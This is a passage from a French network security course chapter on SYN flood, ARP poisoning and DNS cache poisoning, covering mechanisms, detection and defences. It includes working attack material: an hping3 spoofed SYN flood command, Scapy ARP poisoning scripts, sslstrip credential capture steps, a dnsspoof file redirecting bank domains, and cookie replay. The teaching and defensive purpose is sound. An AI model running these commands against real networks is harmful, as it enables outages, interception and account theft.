🔝 Retour au [Sommaire](/SOMMAIRE.md)

# 6.3 Attaques spécifiques : SYN flood, ARP poisoning, DNS spoofing

## Introduction

Dans la section précédente, nous avons examiné les principes généraux des attaques par spoofing, sniffing et man-in-the-middle. Cette section approfondit trois attaques spécifiques qui exploitent les vulnérabilités fondamentales de TCP/IP et qui ont marqué l'histoire de la sécurité réseau par leur efficacité et leur impact.

Ces trois attaques représentent des **archétypes** de menaces réseau :

- **SYN Flood** : Déni de service par épuisement des ressources d'état
- **ARP Poisoning** : Compromission de la couche liaison pour le man-in-the-middle
- **DNS Cache Poisoning** : Corruption des infrastructures de nommage

Comprendre ces attaques en profondeur permet de :
- Apprécier les défis de la sécurité réseau
- Concevoir des systèmes résilients
- Diagnostiquer des incidents de sécurité
- Évaluer l'efficacité des protections

## 1. SYN Flood : l'attaque par déni de service classique

### 1.1 Contexte et historique

Le **SYN flood** est apparu au milieu des années 1990 et reste l'une des attaques DDoS les plus répandues en 2024. Elle exploite un aspect fondamental de TCP : la **nécessité de maintenir un état** pour les connexions.

**Premier incident majeur documenté** : En 1996, Panix (un des premiers FAI de New York) a été complètement paralysé pendant plusieurs jours par une attaque SYN flood, prouvant la vulnérabilité des serveurs face à cette technique.

### 1.2 Rappel du three-way handshake TCP

```
État normal d'établissement de connexion :

Client                                    Serveur
  |                                          |
  |  SYN (seq=x)                             |
  |----------------------------------------->|
  |                                          | État: SYN_RECEIVED
  |                     SYN-ACK (seq=y, ack=x+1)
  |<-----------------------------------------|
  |                                          |
  |  ACK (ack=y+1)                           |
  |----------------------------------------->|
  |                                          | État: ESTABLISHED
  |            Connexion établie             |

Durée typique : quelques millisecondes
Ressources allouées : socket, buffer mémoire, contexte de connexion
```

**Vulnérabilité** : Le serveur **doit** allouer des ressources dès la réception du SYN, avant que la connexion ne soit complètement établie.

### 1.3 Mécanisme de l'attaque SYN Flood classique

#### Principe

L'attaquant envoie un **déluge de paquets SYN** sans jamais envoyer l'ACK final, laissant le serveur avec des connexions semi-ouvertes qui consomment ses ressources.

```
Attaquant                                 Serveur
  |                                          |
  |  SYN (src: IP_falsifiée_1)               |
  |----------------------------------------->| Allocation ressources #1
  |                                          | Timer démarré (75s par défaut)
  |  SYN (src: IP_falsifiée_2)               |
  |----------------------------------------->| Allocation ressources #2
  |                                          |
  |  SYN (src: IP_falsifiée_3)               |
  |----------------------------------------->| Allocation ressources #3
  |                                          |
  |  ... (milliers de SYN/seconde)           |
  |----------------------------------------->| ...
  |                                          |
  |                   SYN-ACK (→ IP falsifiées)
  |                   (jamais reçu par l'attaquant)
  |                                          |
  |                                          | Queue SYN saturée
  |                                          | Nouvelles connexions REJETÉES

Client légitime essaie de se connecter :
  |  SYN                                     |
  |----------------------------------------->|
  |                      Connection Refused  |
  |<-----------------------------------------|

Service indisponible !
```

#### Détails techniques de l'allocation de ressources

**Structure de données sur le serveur (Linux)** :

```c
// Simplifié - structure pour une connexion en attente
struct tcp_request_sock {
    struct request_sock req;
    __u32 rcv_isn;           // Initial Sequence Number reçu
    __u32 snt_isn;           // ISN envoyé
    __be32 saddr;            // Adresse source
    __be16 sport;            // Port source
    struct tcp_options_received opt; // Options TCP
    unsigned long expires;    // Timestamp d'expiration
    // ... autres champs
};

// Queue des connexions semi-ouvertes
struct listen_sock {
    u32 max_qlen_log;        // Taille maximale (ex: 1024)
    u32 num_syn_queues;
    struct request_sock *syn_queue[]; // Tableau des requêtes
};
```

**Ressources allouées par connexion SYN_RECEIVED** :
- ~280 octets de mémoire (structure request_sock)
- Entrée dans la table de hachage des connexions
- Timer pour retransmission SYN-ACK (backoff exponentiel)
- Calcul de l'ISN et des options TCP

**Limites par défaut** :

```bash
# Linux - taille de la queue SYN
cat /proc/sys/net/ipv4/tcp_max_syn_backlog
# Typique : 1024-4096

# Timeout pour les connexions SYN_RECEIVED
cat /proc/sys/net/ipv4/tcp_synack_retries
# Par défaut : 5 retransmissions
# Durée totale : 3s + 6s + 12s + 24s + 48s = ~93s
```

#### Calcul de l'impact

**Scénario d'attaque** :

```
Serveur :
- tcp_max_syn_backlog = 1024
- Temps avant timeout = 93 secondes

Attaquant envoie 100 SYN/seconde :
- En 10 secondes : 1000 SYN dans la queue
- Queue saturée
- Toute nouvelle connexion légitime est rejetée pendant 93 secondes

Attaquant envoie 1000 SYN/seconde :
- Queue saturée en 1 seconde
- Maintien de la saturation trivial
- Service complètement indisponible
```

**Ampleur nécessaire pour une attaque efficace** :

```
Petit serveur web :
- 10-50 SYN/seconde suffisent pour perturber
- 100-200 SYN/seconde pour rendre indisponible

Serveur d'entreprise :
- 500-2000 SYN/seconde nécessaires
- Dépend de la capacité et des protections

Infrastructure majeure (Google, Cloudflare) :
- Millions de SYN/seconde nécessaires
- Protections multicouches en place
- Absorption via anycast et load balancing
```

### 1.4 Variantes de SYN Flood

#### 1.4.1 Direct SYN Flood

**Caractéristiques** :
- Adresse source réelle de l'attaquant
- Reçoit les SYN-ACK mais les ignore
- Plus facile à tracer

```
Attaquant (IP réelle: 203.0.113.50)
  |
  |  SYN (src: 203.0.113.50, dst: serveur:80)
  |----------------------------------------->|
  |                                          |
  |                      SYN-ACK             |
  |<-----------------------------------------|
  |                                          |
  |  (ignore le SYN-ACK, ne répond pas)      |
  |                                          |
  |  SYN (nouveau port source)               |
  |----------------------------------------->|
  |  SYN (nouveau port source)               |
  |----------------------------------------->|

Avantage pour l'attaquant :
- Peut contrôler finement l'attaque
- Pas besoin de capacité de spoofing

Désavantage :
- Traçable facilement
- Peut être bloqué par IP source
```

#### 1.4.2 Spoofed SYN Flood

**Caractéristiques** :
- Adresse source falsifiée (aléatoire ou ciblée)
- Impossible à tracer directement
- Plus difficile à bloquer

```
Attaquant
  |
  |  SYN (src: IP_aléatoire_1, dst: serveur:80)
  |----------------------------------------->|
  |                                          |
  |                  SYN-ACK → IP_aléatoire_1
  |                  (hôte inexistant ou ignore)
  |                                          |
  |  SYN (src: IP_aléatoire_2, dst: serveur:80)
  |----------------------------------------->|
  |                                          |
  |  SYN (src: IP_aléatoire_3, dst: serveur:80)
  |----------------------------------------->|

Génération des IPs sources :
for i in 1..1000000:
    fake_ip = random_ip()
    send_syn(src=fake_ip, dst=target:80)
```

**Implémentation avec hping3** :

```bash
# SYN flood avec IP source aléatoire
hping3 -S -p 80 --flood --rand-source target.example.com

# Paramètres :
# -S : flag SYN
# -p 80 : port cible
# --flood : envoyer aussi vite que possible
# --rand-source : IP source aléatoire

# Résultat : des milliers de SYN/seconde depuis des IPs différentes
```

#### 1.4.3 Distributed SYN Flood (DDoS)

**Caractéristiques** :
- Attaque depuis de multiples sources (botnet)
- Volume massif impossible à générer depuis une seule machine
- Très difficile à bloquer (pas d'IP source unique)

```
Botnet (10 000 machines compromises dans le monde entier)
    |  |  |  |  |  |  |  |  |  |
    |  |  |  |  |  |  |  |  |  |
    ↓  ↓  ↓  ↓  ↓  ↓  ↓  ↓  ↓  ↓
         Serveur cible

Chaque bot envoie 100 SYN/seconde :
- Total : 1 000 000 SYN/seconde
- Saturation garantie de presque n'importe quel serveur
- Saturation possible de la bande passante en amont

Caractéristiques du trafic :
- IPs sources légitimes (machines compromises réelles)
- Distribuées géographiquement
- Difficile de distinguer des clients légitimes
```

**Évolution des DDoS** :

```
2000-2010 :
- Taille : 1-10 Gbps
- Sources : Centaines de bots

2010-2020 :
- Taille : 100-600 Gbps
- Sources : Dizaines de milliers de bots
- Record : 1.35 Tbps (GitHub, 2018) via memcached amplification

2020-2024 :
- Taille : 1-3.5+ Tbps
- Sources : Millions d'appareils IoT
- Record : 3.47 Tbps (Cloudflare, 2024) via HTTP/2 Rapid Reset
```

#### 1.4.4 SYN-ACK Flood

Variante ciblant les clients plutôt que les serveurs :

```
Attaquant envoie des SYN-ACK non sollicités :
  src: attaquant
  dst: victime:random_port
  flags: SYN-ACK

Victime reçoit SYN-ACK sans avoir envoyé de SYN :
- Envoie RST (reset)
- Consomme CPU pour traiter
- Si volume élevé : saturation de la pile TCP

Moins efficace que SYN flood classique mais :
- Peut saturer des firewalls stateless
- Peut perturber des systèmes embarqués
```

### 1.5 Détection de SYN Flood

#### 1.5.1 Indicateurs système

**Symptômes sur le serveur** :

```bash
# Nombre élevé de connexions SYN_RECV
netstat -an | grep SYN_RECV | wc -l
# Normal : 0-10
# Sous attaque : 500-4096 (limite atteinte)

# Monitoring détaillé
ss -tan state syn-recv | wc -l

# Vérifier si la queue SYN est pleine
netstat -s | grep "SYNs to LISTEN"
# Rechercher : "times the listen queue of a socket overflowed"
# Augmentation rapide = attaque probable
```

**Analyse avec netstat** :

```bash
# Pendant une attaque
netstat -an | grep :80 | grep SYN_RECV

tcp  0  0 192.168.1.100:80  203.0.113.45:12345  SYN_RECV
tcp  0  0 192.168.1.100:80  198.51.100.23:54321 SYN_RECV
tcp  0  0 192.168.1.100:80  172.16.45.67:23456  SYN_RECV
...
(des centaines ou milliers de lignes)

Si IPs sources très variées et aléatoires :
→ SYN flood avec spoofing

Si IPs sources concentrées :
→ SYN flood direct ou DDoS limité
```

#### 1.5.2 Analyse réseau

**Capture avec tcpdump** :

```bash
# Capturer les paquets SYN sur le port 80
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0' port 80

# Compter les SYN par seconde
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' port 80 -c 1000 -tt | \
  awk '{print int($1)}' | uniq -c

# Résultat normal :
     5 1638360001
     7 1638360002
     4 1638360003

# Sous attaque :
   523 1638360001
   847 1638360002
  1205 1638360003
```

**Analyse avec Wireshark** :

```
Filtres d'affichage pertinents :
tcp.flags.syn==1 && tcp.flags.ack==0  # SYN uniquement
tcp.analysis.retransmission           # Retransmissions
tcp.analysis.lost_segment             # Segments perdus

Statistiques > Conversations TCP :
- Nombreuses connexions avec peu ou pas de données
- Connexions dans l'état SYN_SENT
- Sources très diverses

Statistiques > Endpoints :
- Distribution anormale des IPs sources
- Pics de trafic SYN
```

#### 1.5.3 Détection automatisée

**Fail2ban avec règle SYN flood** :

```ini
# /etc/fail2ban/filter.d/syn-flood.conf
[Definition]
failregex = ^.*SYN.*from <HOST>.*$
ignoreregex =

# /etc/fail2ban/jail.local
[syn-flood]
enabled = true
port = http,https
filter = syn-flood
logpath = /var/log/messages
maxretry = 20
findtime = 5
bantime = 600
```

**Détection via IDS (Snort)** :

```
# Règle Snort pour détecter SYN flood
alert tcp any any -> $HOME_NET any (flags:S; \
    threshold: type both, track by_dst, count 100, seconds 10; \
    msg:"Possible SYN flood"; sid:1000001;)

# Si plus de 100 SYN vers la même destination en 10 secondes
# → Alerte
```

**Monitoring avec collectd/Prometheus** :

```yaml
# Métrique : taux de connexions SYN_RECV
- job_name: 'tcp_syn_recv'
  scrape_interval: 5s
  static_configs:
    - targets: ['localhost:9100']
  metric_relabel_configs:
    - source_labels: [__name__]
      regex: 'node_netstat_Tcp_CurrEstab'
      action: keep

# Alerte si SYN_RECV > seuil pendant 1 minute
alert: HighSynRecv
expr: node_netstat_Tcp_SynRecv > 1000
for: 1m
labels:
  severity: warning
annotations:
  summary: "Possible SYN flood on {{ $labels.instance }}"
```

### 1.6 Protections contre SYN Flood

#### 1.6.1 SYN Cookies

**Principe révolutionnaire** : Ne **pas** allouer de ressources avant la fin du handshake.

**Mécanisme** :

```
Client                                    Serveur
  |                                          |
  |  SYN (seq=x)                             |
  |----------------------------------------->|
  |                                          |
  |          Pas d'allocation de ressources !
  |          Calcul d'un cookie cryptographique :
  |          cookie = hash(IP_src, port_src, IP_dst, port_dst, timestamp, secret)
  |                                          |
  |                SYN-ACK (seq=cookie)      |
  |<-----------------------------------------|
  |                                          |
  |  ACK (ack=cookie+1)                      |
  |----------------------------------------->|
  |                                          |
  |          Validation du cookie :
  |          recalcul = hash(IP, ports, timestamp_récent, secret)
  |          if (ack-1 == recalcul):
  |              connexion légitime !
  |              Allocation des ressources
  |          else:
  |              Paquet ignoré
  |                                          |
  |            Connexion établie             |
```

**Avantages** :
- **Zéro état** avant le ACK final
- Impossible de saturer la queue SYN
- Transparent pour les clients légitimes
- Ressources allouées uniquement pour connexions complètes

**Inconvénients** :
- Perte des options TCP (timestamps, window scaling) dans certaines implémentations
- Légère surcharge CPU pour le calcul du cookie
- Ne protège pas contre les attaques de bande passante

**Activation sur Linux** :

```bash
# Vérifier l'état
cat /proc/sys/net/ipv4/tcp_syncookies
# 0 = désactivé
# 1 = activé seulement si queue SYN pleine (recommandé)
# 2 = toujours activé

# Activer en mode automatique (recommandé)
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

# ou via sysctl
sysctl -w net.ipv4.tcp_syncookies=1

# Permanent dans /etc/sysctl.conf
net.ipv4.tcp_syncookies = 1
```

#### 1.6.2 Augmentation de la queue SYN

```bash
# Augmenter la taille de la backlog queue
sysctl -w net.ipv4.tcp_max_syn_backlog=8192

# Augmenter la queue d'écoute de l'application
# Dans le code serveur :
listen(socket_fd, 1024);  // Au lieu de 128

# Réduire les timeouts
sysctl -w net.ipv4.tcp_synack_retries=2  # Au lieu de 5
# Temps total : 3s + 6s = 9s au lieu de 93s
```

**Trade-offs** :
- ✅ Absorbe les bursts légitimes
- ✅ Augmente la résilience
- ❌ Consomme plus de mémoire
- ❌ Ne résout pas une attaque massive

#### 1.6.3 Rate Limiting avec iptables

```bash
# Limiter les nouvelles connexions SYN
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Explication :
# --limit 10/s : maximum 10 SYN par seconde en moyenne
# --limit-burst 20 : permet un burst de 20 SYN
# Les SYN excédentaires sont droppés

# Variante : limiter par IP source
iptables -A INPUT -p tcp --syn -m recent --name synflood --set
iptables -A INPUT -p tcp --syn -m recent --name synflood --update \
    --seconds 1 --hitcount 10 -j DROP

# Limite à 10 SYN par seconde par IP source
```

#### 1.6.4 Utilisation d'un reverse proxy / load balancer

```
Internet
    ↓
[HAProxy / Nginx / Cloudflare]
    |
    | - Absorbe les SYN flood
    | - SYN cookies natifs
    | - Rate limiting avancé
    | - Filtrage d'IPs malveillantes
    ↓
Serveur backend (protégé)
```

**Configuration HAProxy** :

```
# haproxy.cfg
global
    maxconn 50000

defaults
    mode http
    timeout connect 5s
    timeout client 30s
    timeout server 30s

    # Protection SYN flood
    option http-server-close
    option forwardfor

frontend web
    bind *:80

    # Rate limiting
    stick-table type ip size 100k expire 30s store conn_rate(10s)
    tcp-request connection track-sc0 src
    tcp-request connection reject if { sc_conn_rate(0) gt 20 }

    default_backend servers

backend servers
    balance roundrobin
    server srv1 192.168.1.10:80 check
    server srv2 192.168.1.11:80 check
```

#### 1.6.5 Filtrage en amont (ISP / Transit)

```
Pour les attaques DDoS volumineuses :

Client ← ISP (filtrage) ← Internet

ISP peut :
- Détecter les patterns d'attaque
- Bloquer les IPs sources malveillantes
- Rate-limit le trafic entrant
- Rediriger vers des scrubbing centers

Services spécialisés :
- Cloudflare DDoS Protection
- AWS Shield
- Akamai Kona Site Defender
- Arbor Networks
```

### 1.7 Cas réel : Attaque GitHub 2018

**Contexte** : Le 28 février 2018, GitHub a subi la plus grande attaque DDoS de l'époque.

**Détails de l'attaque** :

```
Vecteur : Memcached amplification (pas pure SYN flood, mais principe similaire)
Peak : 1.35 Tbps
Paquets : 126.9 millions de paquets/seconde
Durée du peak : environ 8 minutes
Source : Milliers de serveurs memcached mal configurés

Technique :
1. Attaquant envoie requêtes UDP vers serveurs memcached
2. IP source falsifiée = GitHub
3. Serveurs memcached répondent avec des données volumineuses
4. Facteur d'amplification : jusqu'à 51 000x

Résultat :
- GitHub indisponible pendant 10 minutes
- Mitigation via Akamai Prolexic
- Rétablissement complet en ~20 minutes
```

**Leçons apprises** :
- Les protections traditionnelles sont insuffisantes
- Nécessité de scrubbing centers avec capacité multi-Tbps
- Importance de sécuriser les serveurs amplificateurs (memcached, DNS, NTP)

## 2. ARP Poisoning : compromission de la couche liaison

### 2.1 Approfondissement du mécanisme

Nous avons vu les bases dans la section précédente. Approfondissons les aspects techniques et avancés.

#### 2.1.1 Structure d'un paquet ARP

```
Trame Ethernet :
+------------------+
| MAC dest (6 oct) | FF:FF:FF:FF:FF:FF (broadcast) ou unicast
| MAC src (6 oct)  | AA:AA:AA:AA:AA:AA (attaquant)
| Type (2 oct)     | 0x0806 (ARP)
+------------------+
| Paquet ARP       |
+------------------+

Paquet ARP (28 octets) :
+------------------------+
| Hardware type (2 oct)  | 0x0001 (Ethernet)
| Protocol type (2 oct)  | 0x0800 (IPv4)
| HW addr len (1 oct)    | 6 (MAC = 6 octets)
| Proto addr len (1 oct) | 4 (IPv4 = 4 octets)
| Operation (2 oct)      | 1 (Request) ou 2 (Reply)
| Sender HW addr (6 oct) | MAC de l'émetteur
| Sender proto addr (4)  | IP de l'émetteur
| Target HW addr (6 oct) | MAC de la cible (00:00:00:00:00:00 si request)
| Target proto addr (4)  | IP de la cible
+------------------------+
```

#### 2.1.2 ARP Reply falsifié détaillé

**Paquet ARP empoisonné (exemple)** :

```
Objectif : Faire croire à 192.168.1.10 que le routeur (192.168.1.1)
           est à l'adresse MAC de l'attaquant

Trame Ethernet :
  Dest MAC: CC:CC:CC:CC:CC:CC (victime)
  Src MAC:  XX:XX:XX:XX:XX:XX (attaquant)
  Type: 0x0806

Paquet ARP :
  Operation: 2 (Reply)
  Sender HW:  XX:XX:XX:XX:XX:XX (attaquant)
  Sender IP:  192.168.1.1 (routeur - usurpé !)
  Target HW:  CC:CC:CC:CC:CC:CC (victime)
  Target IP:  192.168.1.10 (victime)

Interprétation par la victime :
"L'adresse 192.168.1.1 appartient à XX:XX:XX:XX:XX:XX"
→ Met à jour sa table ARP
→ Tout trafic vers le routeur va maintenant à l'attaquant
```

**Code Python avec Scapy** :

```python
from scapy.all import ARP, send
import time

# Configuration
victim_ip = "192.168.1.10"
victim_mac = "CC:CC:CC:CC:CC:CC"
gateway_ip = "192.168.1.1"
attacker_mac = "XX:XX:XX:XX:XX:XX"  # get_if_hwaddr('eth0')

# Création du paquet ARP empoisonné
poison_victim = ARP(
    op=2,                    # ARP Reply
    psrc=gateway_ip,         # IP usurpée (routeur)
    hwsrc=attacker_mac,      # MAC de l'attaquant
    pdst=victim_ip,          # IP de la victime
    hwdst=victim_mac         # MAC de la victime
)

# Empoisonnement du routeur (pour MITM bidirectionnel)
poison_gateway = ARP(
    op=2,
    psrc=victim_ip,          # IP usurpée (victime)
    hwsrc=attacker_mac,
    pdst=gateway_ip,
    hwdst=gateway_mac        # MAC réelle du routeur
)

# Boucle d'empoisonnement continu
print("[*] Démarrage de l'ARP poisoning...")
try:
    while True:
        send(poison_victim, verbose=False)
        send(poison_gateway, verbose=False)
        time.sleep(2)  # Toutes les 2 secondes
except KeyboardInterrupt:
    print("\n[*] Arrêt de l'attaque")
    # Restauration optionnelle des tables ARP
```

### 2.2 Techniques avancées d'ARP Poisoning

#### 2.2.1 ARP Poisoning ciblé vs masse

**Ciblé (stealth)** :
```python
# Empoisonner seulement une victime spécifique
targets = ["192.168.1.10"]

for target in targets:
    poison_packet = create_arp_poison(target, gateway)
    send(poison_packet)

# Avantages :
# - Moins détectable (moins de trafic ARP)
# - Impact limité sur le réseau
# - Précis pour l'espionnage ciblé
```

**Masse (aggressif)** :
```python
# Empoisonner tout le réseau
for ip in range(1, 255):
    target = f"192.168.1.{ip}"
    poison_packet = create_arp_poison(target, gateway)
    send(poison_packet)

# Résultat :
# - Tout le trafic du réseau transite par l'attaquant
# - Très détectable (tempête ARP)
# - Impact réseau significatif
```

#### 2.2.2 Gratuitous ARP pour persistance

**Technique** : Envoyer périodiquement des ARP gratuits pour maintenir l'empoisonnement.

```
Problème sans maintenance :
- Cache ARP expire (typiquement après 60-300 secondes)
- Requêtes ARP légitimes re-résolvent l'adresse
- Empoisonnement perdu

Solution :
- Envoyer des ARP Reply gratuits toutes les 2-5 secondes
- Refresh continu des caches ARP empoisonnés
- Maintien de l'attaque indéfiniment
```

**Implémentation** :

```python
import time
from scapy.all import ARP, send

def maintain_poisoning(victim_ip, gateway_ip, interval=2):
    """Maintien l'empoisonnement ARP"""
    while True:
        # Empoisonner la victime
        send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip), verbose=False)
        # Empoisonner le routeur
        send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip), verbose=False)
        time.sleep(interval)

# Lancement
maintain_poisoning("192.168.1.10", "192.168.1.1")
```

#### 2.2.3 ARP Spoofing avec MAC Cloning

**Technique avancée** : Cloner temporairement la MAC légitime.

```
Scénario :
1. Attaquant découvre MAC du routeur : RR:RR:RR:RR:RR:RR
2. Attaquant force déconnexion temporaire du routeur (DoS local)
3. Attaquant change sa propre MAC pour RR:RR:RR:RR:RR:RR
4. Réseau pense que l'attaquant EST le routeur
5. Pas besoin d'ARP poisoning continu

Commandes Linux :
# Changer sa MAC
ip link set dev eth0 down
ip link set dev eth0 address RR:RR:RR:RR:RR:RR
ip link set dev eth0 up

Risques :
- Conflit si le vrai routeur est actif
- Très détectable par les switches (même MAC sur 2 ports)
```

### 2.3 Attaques dérivées de l'ARP Poisoning

#### 2.3.1 SSL Stripping (suite d'ARP MITM)

Une fois le MITM établi via ARP :

```
1. Tout le trafic HTTP/HTTPS transite par l'attaquant

2. Pour les connexions HTTPS :
   Client → HTTP → Attaquant → HTTPS → Serveur

3. Attaquant maintient deux connexions :
   - HTTP avec le client (non chiffré)
   - HTTPS avec le serveur (chiffré)

4. Modifications :
   - Réécrit tous les liens https:// en http://
   - Retire les redirections HTTPS
   - Supprime les headers HSTS

5. Résultat :
   - Client pense être en HTTP normal
   - Serveur pense communiquer en HTTPS
   - Attaquant voit tout en clair
```

**Automatisation avec sslstrip** :

```bash
# Après ARP poisoning actif

# 1. Activer le forwarding IP
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. Rediriger HTTP vers sslstrip
iptables -t nat -A PREROUTING -p tcp --dport 80 \
    -j REDIRECT --to-port 8080

# 3. Lancer sslstrip
sslstrip -l 8080 -w sslstrip.log

# 4. Observer les credentials capturés
tail -f sslstrip.log
```

#### 2.3.2 DNS Hijacking via ARP MITM

```
1. MITM établi via ARP poisoning

2. Attaquant intercepte toutes les requêtes DNS

3. Pour certains domaines :
   - Répond avec de fausses adresses IP
   - Redirige vers sites de phishing

4. Exemple :
   Client demande : www.banque.fr
   Attaquant répond : 6.6.6.6 (site malveillant)
   Client se connecte au faux site
```

**Implémentation avec dnsspoof** :

```bash
# Fichier de configuration
cat > /etc/dns-spoof.conf << EOF
www.banque.fr    6.6.6.6
login.banque.fr  6.6.6.6
*.paypal.com     6.6.6.6
EOF

# Lancement (après ARP MITM)
dnsspoof -i eth0 -f /etc/dns-spoof.conf
```

#### 2.3.3 Session Hijacking

```
Séquence d'attaque complète :

1. ARP poisoning → MITM position
2. Sniffing du trafic HTTP
3. Capture de cookie de session :
   Cookie: PHPSESSID=abc123xyz789; user_id=42

4. Injection dans le navigateur de l'attaquant :
   document.cookie = "PHPSESSID=abc123xyz789"

5. Accès au compte de la victime sans mot de passe

Alternative - Rejeu avec curl :
curl -H "Cookie: PHPSESSID=abc123xyz789" \
     https://example.com/account
```

### 2.4 Détection forensique d'ARP Poisoning

#### 2.4.1 Analyse des anomalies ARP

**Duplicate MAC detection** :

```bash
# Script de détection
#!/bin/bash

# Capturer les associations IP-MAC
arp -an > /tmp/arp_current.txt

# Chercher les duplications de MAC
awk '{print $4}' /tmp/arp_current.txt | sort | uniq -d

# Si sortie non vide : même MAC pour plusieurs IPs
# → Suspect (ou NAT/proxy légitime)

# Exemple de sortie suspecte :
# xx:xx:xx:xx:xx:xx apparaît pour :
#   192.168.1.1 (routeur)
#   192.168.1.50 (attaquant se faisant passer pour le routeur)
```

**Monitoring des changements MAC** :

```bash
# Script simple de monitoring
#!/bin/bash

BASELINE="/etc/arp-baseline.txt"
CURRENT="/tmp/arp-current.txt"

# Première exécution : créer baseline
if [ ! -f "$BASELINE" ]; then
    arp -an > "$BASELINE"
    echo "Baseline créée"
    exit 0
fi

# Captures actuelle
arp -an > "$CURRENT"

# Comparer
diff "$BASELINE" "$CURRENT" | grep "^[<>]"

# Alerter sur les changements
if [ $? -eq 0 ]; then
    echo "ALERTE : Changement dans la table ARP détecté !"
    logger -p security.alert "ARP table modified"
fi
```

**Avec arpwatch** :

```bash
# Installation
apt-get install arpwatch

# Démarrage
systemctl start arpwatch

# Logs dans /var/log/arpwatch/
# Format :
# hostname: gateway
# ip address: 192.168.1.1
# ethernet address: rr:rr:rr:rr:rr:rr
# Previous ethernet address: xx:xx:xx:xx:xx:xx
# timestamp: Wednesday, Dec 6, 2023  14:23:45 +0100

# Alertes email automatiques en cas de changement
```

#### 2.4.2 Détection via analyse temporelle

**Anomalie de timing des ARP Reply** :

```
ARP légitime :
Request → Reply (quelques ms de délai)

ARP poisoning :
Reply gratuit sans Request (suspect)
Multiple Reply rapides pour la même IP (très suspect)
```

**Capture et analyse** :

```bash
# Capturer le trafic ARP
tcpdump -i eth0 arp -w arp_traffic.pcap

# Analyse avec tshark
tshark -r arp_traffic.pcap -Y "arp.opcode==2" \
    -T fields -e frame.time_delta -e arp.src.hw_mac

# Chercher :
# - Multiples Reply avec delta < 100ms
# - Reply sans Request correspondant
# - Patterns répétitifs (toutes les 2 secondes)
```

#### 2.4.3 Détection par inconsistances réseau

```bash
# Vérifier que la MAC du routeur est cohérente

# Méthode 1 : ping + ARP
ping -c 1 192.168.1.1
arp -n | grep 192.168.1.1

# Méthode 2 : traceroute + inspection
traceroute -n 8.8.8.8
# Premier hop doit correspondre au routeur

# Méthode 3 : Comparer avec plusieurs machines
# Sur machine A :
arp -n | grep 192.168.1.1
# Sur machine B :
arp -n | grep 192.168.1.1
# Si MACs différentes → ARP poisoning ciblé !
```

### 2.5 Protections contre ARP Poisoning

#### 2.5.1 Dynamic ARP Inspection (DAI)

**Configuration sur switch Cisco** :

```
! Activer DHCP snooping (prérequis)
switch(config)# ip dhcp snooping
switch(config)# ip dhcp snooping vlan 10

! Configurer DAI
switch(config)# ip arp inspection vlan 10

! Port trusted (uplink, routeur)
switch(config)# interface GigabitEthernet0/1
switch(config-if)# ip arp inspection trust

! Ports untrusted (clients)
switch(config)# interface range GigabitEthernet0/2-24
switch(config-if)# ip arp inspection limit rate 15

! Validation additionnelle
switch(config)# ip arp inspection validate src-mac dst-mac ip

! Logging
switch(config)# ip arp inspection log-buffer entries 1024
switch(config)# ip arp inspection log-buffer logs 100 interval 10
```

**Fonctionnement de DAI** :

```
1. Switch maintient une binding database (via DHCP snooping)
   IP ↔ MAC ↔ Port ↔ VLAN

2. Chaque paquet ARP est inspecté :
   - Vérification IP-MAC contre la database
   - Validation src-mac (MAC Ethernet vs MAC ARP)
   - Validation dst-mac

3. Si incohérence :
   - Paquet droppé
   - Log généré
   - Possible err-disable du port

Exemple de détection :
Paquet ARP :
  Src MAC Ethernet: XX:XX:XX:XX:XX:XX
  Src MAC ARP:      YY:YY:YY:YY:YY:YY  ← Différent !
→ Paquet suspect, rejeté
```

#### 2.5.2 Entries ARP statiques

**Configuration système** :

```bash
# Linux - entrées statiques
arp -s 192.168.1.1 RR:RR:RR:RR:RR:RR

# Permanent (via script au démarrage)
cat >> /etc/rc.local << EOF
arp -s 192.168.1.1 RR:RR:RR:RR:RR:RR
arp -s 192.168.1.254 GG:GG:GG:GG:GG:GG
EOF

# Windows
arp -s 192.168.1.1 RR-RR-RR-RR-RR-RR

# Vérification
arp -a
# Doit afficher "static" ou "permanent"
```

**Limites** :
- ✅ Protection complète contre ARP poisoning
- ❌ Pas scalable (gestion manuelle)
- ❌ Problématique si changement matériel
- ❌ Incompatible avec DHCP dynamique

**Usage recommandé** : Servers critiques avec IPs fixes

#### 2.5.3 ArpON (ARP handler inspection)

**Daemon de protection ARP pour Linux** :

```bash
# Installation
apt-get install arpon

# Configuration /etc/arpon.conf
DAEMON_OPTS="-d -y -p"
# -d : daemon mode
# -y : dynamic ARP inspection
# -p : static ARP inspection

# Démarrage
systemctl start arpon

# ArpON va :
# - Monitorer toutes les requêtes/réponses ARP
# - Bloquer les ARP Reply non sollicités
# - Empêcher la modification de la table ARP
# - Logger les tentatives d'empoisonnement
```

#### 2.5.4 Segmentation réseau

```
Réseau plat (vulnérable) :
+--------------------------------------------------+
| VLAN 1 : Tous les utilisateurs + serveurs        |
| → ARP poisoning possible entre tous les hôtes    |
+--------------------------------------------------+

Réseau segmenté (sécurisé) :
+------------------------+
| VLAN 10 : Serveurs     |
+------------------------+
        ↕ (routeur)
+------------------------+
| VLAN 20 : Département A|
+------------------------+
        ↕ (routeur)
+------------------------+
| VLAN 30 : Département B|
+------------------------+

Avantages :
- ARP ne traverse pas les VLANs
- Attaque limitée au segment local
- Isolation des ressources critiques
```

## 3. DNS Cache Poisoning : corruption de l'infrastructure de nommage

### 3.1 Anatomie détaillée de l'attaque Kaminsky

#### 3.1.1 Rappel du fonctionnement DNS

```
Résolution DNS normale :

Client                 Résolveur              Serveur autoritatif
  |                        |                          |
  |  example.com ?         |                          |
  |----------------------->|                          |
  |                        |  example.com ?           |
  |                        |------------------------->|
  |                        |                          |
  |                        |  93.184.216.34 (TTL: 3600)
  |                        |<-------------------------|
  |  93.184.216.34         |                          |
  |<-----------------------|                          |
  |                        |                          |
  |                Cache : example.com → 93.184.216.34
  |                Expire dans 3600 secondes
```

#### 3.1.2 Fenêtre de vulnérabilité classique

**Structure d'une requête/réponse DNS** :

```
Requête DNS (UDP) :
+-------------------+
| Transaction ID    | 16 bits (0x0000-0xFFFF)
| Flags             |
| Questions: 1      |
| Answers: 0        |
+-------------------+
| Query             |
| Name: example.com |
